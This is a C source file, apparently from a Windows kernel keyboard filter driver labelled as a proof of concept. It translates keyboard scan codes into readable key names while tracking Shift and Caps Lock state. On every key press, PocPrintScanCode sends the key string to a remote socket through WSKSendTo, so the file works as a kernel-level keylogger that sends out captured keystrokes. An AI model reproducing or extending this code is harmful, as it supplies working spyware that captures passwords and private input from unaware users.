
#include "kbd.h"
#include "libwsk.h"

UCHAR gKeyString[340][20] =
{
    "?", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BackSpace]", "[Tab]",                               //Normal
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]", "[Enter]", "[Left Ctrl]", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ";", "\'", "~", "[Left Shift]", "\\", "z", "x", "c", "v",
    "b", "n", "m", ",", ".", "/", "[Right Shift]", "[Keypad *]", "[Left Alt]", "[Space]", "[Caps Lock]", "F1", "F2", "F3", "F4", "F5",
    "F6", "F7", "F8", "F9", "F10", "[Num Lock]", "[Scroll Lock]", "[Keypad 7]", "[Keypad 8]", "[Keypad 9]", "[Keypad -]", "[Keypad 4]", "[Keypad 5]", "[Keypad 6]", "[Keypad +]", "[Keypad 1]",
    "[Keypad 2]", "[Keypad 3]", "[Keypad 0]", "[Keypad .]",

    "?", "[ESC]", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "-", "=", "[BackSpace]", "[Tab]",                               //CapsLock
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "[", "]", "[Enter]", "[Left Ctrl]", "A", "S",
    "D", "F", "G", "H", "J", "K", "L", ";", "\'", "~", "[Left Shift]", "\\", "Z", "X", "C", "V",
    "B", "N", "M", ",", ".", "/", "[Right Shift]", "[Keypad *]", "[Left Alt]", "[Space]", "[Caps Lock]", "F1", "F2", "F3", "F4", "F5",
    "F6", "F7", "F8", "F9", "F10", "[Num Lock]", "[Scroll Lock]", "[Keypad 7]", "[Keypad 8]", "[Keypad 9]", "[Keypad -]", "[Keypad 4]", "[Keypad 5]", "[Keypad 6]", "[Keypad +]", "[Keypad 1]",
    "[Keypad 2]", "[Keypad 3]", "[Keypad 0]", "[Keypad .]",

    "?", "[ESC]", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "[BackSpace]", "[Tab]",                               //Shift
    "Q", "W", "E", "R", "T", "Y", "U", "I", "O", "P", "{", "}", "[Enter]", "[Left Ctrl]", "A", "S",
    "D", "F", "G", "H", "J", "K", "L", ":", "\"", "~", "[Left Shift]", "|", "Z", "X", "C", "V",
    "B", "N", "M", "<", ">", "?", "[Right Shift]", "[Keypad *]", "[Left Alt]", "[Space]", "[Caps Lock]", "F1", "F2", "F3", "F4", "F5",
    "F6", "F7", "F8", "F9", "F10", "[Num Lock]", "[Scroll Lock]", "[Keypad 7]", "[Keypad 8]", "[Keypad 9]", "[Keypad -]", "[Keypad 4]", "[Keypad 5]", "[Keypad 6]", "[Keypad +]", "[Keypad 1]",
    "[Keypad 2]", "[Keypad 3]", "[Keypad 0]", "[Keypad .]",

    "?", "[ESC]", "!", "@", "#", "$", "%", "^", "&", "*", "(", ")", "_", "+", "[BackSpace]", "[Tab]",                               //CapsLock + Shift
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "{", "}", "[Enter]", "[Left Ctrl]", "a", "s",
    "d", "f", "g", "h", "j", "k", "l", ":", "\"", "~", "[Left Shift]", "|", "z", "x", "c", "v",
    "b", "n", "m", "<", ">", "?", "[Right Shift]", "[Keypad *]", "[Left Alt]", "[Space]", "[Caps Lock]", "F1", "F2", "F3", "F4", "F5",
    "F6", "F7", "F8", "F9", "F10", "[Num Lock]", "[Scroll Lock]", "[Keypad 7]", "[Keypad 8]", "[Keypad 9]", "[Keypad -]", "[Keypad 4]", "[Keypad 5]", "[Keypad 6]", "[Keypad +]", "[Keypad 1]",
    "[Keypad 2]", "[Keypad 3]", "[Keypad 0]", "[Keypad .]"
};

UCHAR gE0KeyString[50][20] =
{
    "[Right Ctrl]", "[Keypad /]", "[Prt Scr SysRq]", "[Right Alt]", "[Home]", "[Up]", "[PageUp]", "[Left]", "[Right]", 
    "[End]", "[Down]", "[PageDown]", "[Insert]", "[Delete]", "[Left Windows]", "[Right Windows]", "[Menu]", "?"
};

ULONG gKbdStatus = 0;


VOID
PocPrintScanCode(
    IN PKEYBOARD_INPUT_DATA InputData
)
/*
* 打印Scancode
*/
{
    ASSERT(NULL != InputData);

    NTSTATUS Status = 0;

    UCHAR MakeCode = 0;
    ULONG Index = 0;

    PUCHAR Buffer = NULL;
    SIZE_T LengthReturned = 0;

    MakeCode = (UCHAR)InputData->MakeCode;

    if (FlagOn(InputData->Flags, KEY_E0))
    {
        switch (MakeCode) {
        case 0x1D: Buffer = gE0KeyString[0]; break;
        case 0x35: Buffer = gE0KeyString[1]; break;
        case 0x37: Buffer = gE0KeyString[2]; break;
        case 0x38: Buffer = gE0KeyString[3]; break;
        case 0x47: Buffer = gE0KeyString[4]; break;
        case 0x48: Buffer = gE0KeyString[5]; break;
        case 0x49: Buffer = gE0KeyString[6]; break;
        case 0x4B: Buffer = gE0KeyString[7]; break;
        case 0x4D: Buffer = gE0KeyString[8]; break;
        case 0x4F: Buffer = gE0KeyString[9]; break;
        case 0x50: Buffer = gE0KeyString[10]; break;
        case 0x51: Buffer = gE0KeyString[11]; break;
        case 0x52: Buffer = gE0KeyString[12]; break;
        case 0x53: Buffer = gE0KeyString[13]; break;
        case 0x5B: Buffer = gE0KeyString[14]; break;
        case 0x5C: Buffer = gE0KeyString[15]; break;
        case 0x5D: Buffer = gE0KeyString[16]; break;
        default: Buffer = gE0KeyString[17]; break;
        }

        if (MakeCode > 0x5D)
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES, ("Unknow makecode = 0x%x\n", MakeCode));
            return;
        }

        if (FlagOn(InputData->Flags, KEY_BREAK))
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES, ("KeyUp   = %s\n", Buffer));
        }
        else
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES, ("KeyDown = %s\n", Buffer));

            /*
            * Buffer不能用局部变量
            */
            Status = WSKSendTo(ClientSocket, Buffer, strlen((PCHAR)Buffer), &LengthReturned, 0, NULL, 0, NULL, NULL);
        }

    }
    else
    {
        if (MakeCode > 0x54 * 4)
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES, ("Unknow makecode = 0x%x\n", MakeCode));
            return;
        }

        Index = MakeCode;

        if (gKbdStatus & KEY_CAPS)
        {
            Index += 0x54;
        }

        if (gKbdStatus & KEY_SHIFT)
        {
            Index += 0x54 * 2;
        }

        if (FlagOn(InputData->Flags, KEY_BREAK))
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES, ("KeyUp   = %s\n", gKeyString[Index]));
        }
        else
        {
            PT_DBG_PRINT(PTDBG_TRACE_ROUTINES, ("KeyDown = %s\n", gKeyString[Index]));

            Status = WSKSendTo(ClientSocket, gKeyString[Index], strlen((PCHAR)gKeyString[Index]), &LengthReturned, 0, NULL, 0, NULL, NULL);

        }


        if (FlagOn(InputData->Flags, KEY_BREAK))
        {
            switch (MakeCode)
            {
            case 0x2A:
            case 0x36:
                gKbdStatus &= ~KEY_SHIFT;
                break;
            }
        }
        else
        {
            switch (MakeCode)
            {
            case 0x3A:
                gKbdStatus ^= KEY_CAPS;
                break;

            case 0x2A:
            case 0x36:
                gKbdStatus |= KEY_SHIFT;
                break;

            case 0x45:
                gKbdStatus ^= KEY_NUM;
            }
        }
    }

}


VOID
PocConfigureKeyMapping(
    IN PKEYBOARD_INPUT_DATA InputData
)
/*
* 按键映射的功能
*/
{
    UNREFERENCED_PARAMETER(InputData);

    ASSERT(NULL != InputData);

    /*
    * 'Q'的Makecode转换成'W'的Makecode，可以查translate表，Kbdclass的Makecode和Breakcode值是一样的，都是Makecode的值，
    * 区分是看InputData->Flags的标志位是Make还是Break，translate表在README的Reference中
    */
    //if (0x10 == InputData->MakeCode)
    //{
    //    InputData->MakeCode = 0x11;
    //}
}
